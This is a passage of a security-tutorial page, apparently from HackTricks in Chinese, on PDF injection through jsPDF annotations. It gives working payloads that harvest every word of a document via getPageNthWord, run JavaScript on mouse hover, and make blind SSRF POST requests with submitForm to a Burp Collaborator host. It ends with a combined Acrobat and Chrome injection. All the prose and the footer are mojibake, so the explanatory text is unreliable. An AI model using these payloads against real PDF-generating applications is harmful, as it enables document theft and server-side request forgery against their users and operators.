æ£€æŸ¥æšä¸¾å™¨çš„è¾“å‡ºåï¼Œæˆ‘å°è¯•è°ƒç”¨å„ç§å‡½æ•°ï¼Œå¸Œæœ›è¿›è¡Œå¤–éƒ¨è¯·æ±‚æˆ–ä»PDFä¸­è·å–ä¿¡æ¯ã€‚æœ€ç»ˆï¼Œæˆ‘æ‰¾åˆ°äº†ä¸€ä¸ªéå¸¸æœ‰è¶£çš„å‡½æ•°ï¼Œåä¸ºgetPageNthWordï¼Œå®ƒå¯ä»¥ä»PDFæ–‡æ¡£ä¸­æå–å•è¯ï¼Œä»è€Œä½¿æˆ‘èƒ½å¤Ÿçªƒå–å†…å®¹ã€‚è¯¥å‡½æ•°æœ‰ä¸€ä¸ªå¾®å¦™çš„é”™è¯¯ï¼Œæœ‰æ—¶ç¬¬ä¸€ä¸ªå•è¯ä¸ä¼šè¢«æå–ã€‚ä½†å¤§éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œå®ƒä¼šæå–å¤§éƒ¨åˆ†å•è¯ï¼š`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`#)>> <</Type/Annot/Rect[0 0 900 900]/Subtype/Widget/Parent<</FT/Btn/T(a)>>/A<</S/JavaScript/JS(``\
`words = [];`\
`for(page=0;page<this.numPages;page++) {`\
`for(wordPos=0;wordPos<this.getPageNumWords(page);wordPos++) {`\
`word = this.getPageNthWord(page, wordPos, true);`\
`words.push(word);`\
`}`\
`}`\
`app.alert(words);`\
`` `}); ``\
`doc.text(20, 20, 'Click me test');`\
`doc.text(20, 40, 'Abc Def');`\
`doc.text(20, 60, 'Some word');`\
``

æˆ‘å¯¹è‡ªå·±èƒ½å¤Ÿåœ¨Chromeä¸Šçªƒå–PDFå†…å®¹æ„Ÿåˆ°éå¸¸æ»¡æ„ï¼Œå› ä¸ºæˆ‘ä»æœªæƒ³è¿‡è¿™æ˜¯å¯èƒ½çš„ã€‚å°†æ­¤ä¸submitFormå‘é‡ç»“åˆä½¿ç”¨ï¼Œå¯ä»¥å°†æ•°æ®å‘é€åˆ°å¤–éƒ¨æœåŠ¡å™¨ã€‚å”¯ä¸€çš„ç¼ºç‚¹æ˜¯éœ€è¦ç‚¹å‡»ã€‚æˆ‘æƒ³çŸ¥é“æ˜¯å¦å¯ä»¥åœ¨Chromeä¸Šå®ç°æ— éœ€ç‚¹å‡»çš„JavaScriptæ‰§è¡Œã€‚å†æ¬¡æŸ¥çœ‹PDFè§„èŒƒï¼Œæˆ‘æ³¨æ„åˆ°æ³¨é‡Šå­—å…¸ä¸­è¿˜æœ‰ä¸€ä¸ªåä¸ºâ€œEâ€çš„æ¡ç›®ï¼Œå½“é¼ æ ‡è¿›å…¥æ³¨é‡ŠåŒºåŸŸæ—¶å°†æ‰§è¡Œæ³¨é‡Š-åŸºæœ¬ä¸Šæ˜¯ä¸€ä¸ªé¼ æ ‡æ‚¬åœäº‹ä»¶ã€‚ä¸å¹¸çš„æ˜¯ï¼Œè¿™ä¸ç®—ä½œç”¨æˆ·äº¤äº’ä»¥å¯ç”¨è¡¨å•æäº¤ã€‚å› æ­¤ï¼Œå°½ç®¡å¯ä»¥æ‰§è¡ŒJavaScriptï¼Œä½†æ— æ³•å¯¹æ•°æ®è¿›è¡Œä»»ä½•æ“ä½œï¼Œå› ä¸ºæ— æ³•å°†å…¶å‘é€åˆ°å¤–éƒ¨æœåŠ¡å™¨ã€‚å¦‚æœæ‚¨èƒ½å¤Ÿé€šè¿‡æ­¤äº‹ä»¶ä½¿Chromeæäº¤æ•°æ®ï¼Œè¯·å‘Šè¯‰æˆ‘ï¼Œå› ä¸ºæˆ‘ä¼šéå¸¸æ„Ÿå…´è¶£ã€‚æ— è®ºå¦‚ä½•ï¼Œä»¥ä¸‹æ˜¯è§¦å‘é¼ æ ‡æ‚¬åœäº‹ä»¶çš„ä»£ç ï¼š`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/) >> >>``\
``<</Type /Annot /Subtype /Widget /Parent<</FT/Btn/T(a)>> /Rect [0 0 900 900] /AA <</E <</S/JavaScript/JS(app.alert(1))>>/(`});``\
`doc.text(20, 20, 'Test');`\
``
## PDFium/Acrobatä¸­çš„SSRF

å¯ä»¥ä½¿ç”¨PDFium/Acrobatå‘é€POSTè¯·æ±‚æ¥æ‰§è¡ŒSSRFæ”»å‡»ã€‚è¿™å°†æ˜¯ä¸€ç§[ç›²ç›®çš„SSRF](https://portswigger.net/web-security/ssrf/blind)ï¼Œå› ä¸ºæ‚¨å¯ä»¥å‘é€POSTè¯·æ±‚ï¼Œä½†æ— æ³•è¯»å–å“åº”ã€‚è¦æ„é€ POSTè¯·æ±‚ï¼Œå¯ä»¥åƒä¹‹å‰æ¼”ç¤ºçš„é‚£æ ·ä½¿ç”¨/parentå­—å…¸é”®å°†è¡¨å•å…ƒç´ åˆ†é…ç»™æ³¨é‡Šï¼Œä»è€Œå¯ç”¨JavaScriptæ‰§è¡Œã€‚ä½†æ˜¯ï¼Œä¸ä¹‹å‰ä½¿ç”¨æŒ‰é’®ä¸åŒï¼Œæ‚¨å¯ä»¥ä½¿ç”¨å‚æ•°åç§°(/T)å’Œå‚æ•°å€¼(/V)å­—å…¸é”®å°†æ–‡æœ¬å­—æ®µ(/Tx)åˆ†é…ç»™æ³¨é‡Šã€‚è¯·æ³¨æ„ï¼Œæ‚¨å¿…é¡»å°†è¦ä½¿ç”¨çš„å‚æ•°åç§°ä½œä¸ºæ•°ç»„ä¼ é€’ç»™submitFormå‡½æ•°:`#)>>>><</Type/Annot/Rect[ 0 0 900 900]/Subtype/Widget/Parent<</FT/Tx/T(foo)/V(bar)>>/A<</S/JavaScript/JS(`\
`app.alert(1);`\
`this.submitForm('https://aiws4u6uubgfdag94xvc5wbrfilc91.burpcollaborator.net', false, false, ['foo']);`\
`)/(`\
``

æ‚¨ç”šè‡³å¯ä»¥å‘é€åŸå§‹æ¢è¡Œç¬¦ï¼Œè¿™åœ¨é“¾æ¥å…¶ä»–æ”»å‡»ï¼ˆå¦‚[è¯·æ±‚èµ°ç§](https://portswigger.net/web-security/request-smuggling)ï¼‰æ—¶å¯èƒ½å¾ˆæœ‰ç”¨ã€‚POSTè¯·æ±‚çš„ç»“æœå¯ä»¥åœ¨ä»¥ä¸‹Collaboratorè¯·æ±‚ä¸­çœ‹åˆ°ï¼š

![æ˜¾ç¤ºæ¥è‡ªPDFçš„Burp Collaboratorè¯·æ±‚çš„å±å¹•æˆªå›¾](https://portswigger.net/cms/images/3f/61/fd38-article-ssrf-screenshot.png)

æœ€åï¼Œæˆ‘æƒ³ä»¥Chromeå’ŒAcrobat PDFæ³¨å…¥çš„æ··åˆæ–¹å¼ç»“æŸã€‚ç¬¬ä¸€éƒ¨åˆ†å°†JavaScriptæ³¨å…¥åˆ°ç°æœ‰æ³¨é‡Šä¸­ï¼Œä»¥åœ¨Acrobatä¸Šæ‰§è¡ŒJavaScriptã€‚ç¬¬äºŒéƒ¨åˆ†è·³å‡ºæ³¨é‡Šå¹¶æ³¨å…¥ä¸€ä¸ªæ–°çš„æ³¨é‡Šï¼Œä¸ºChromeå®šä¹‰ä¸€ä¸ªæ–°çš„å¯ç‚¹å‡»åŒºåŸŸã€‚æˆ‘å†æ¬¡ä½¿ç”¨AcroformæŠ€å·§æ¥æ³¨å…¥ä¸€ä¸ªæŒ‰é’®ï¼Œä»¥ä¾¿æ‰§è¡ŒJavaScriptï¼š`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`#)/S/JavaScript/JS(app.alert(1))/Type/Action>> >> <</Type/Annot/Rect[0 0 900 700]/Subtype/Widget/Parent<</FT/Btn/T(a)>>/A<</S/JavaScript/JS(app.alert(1)`});``\
`doc.text(20, 20, 'Click me Acrobat');`\
`doc.text(20, 60, 'Click me Chrome');`


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…æ‚¨æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFTæ”¶è—å“](https://opensea.io/collection/the-peass-family)â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
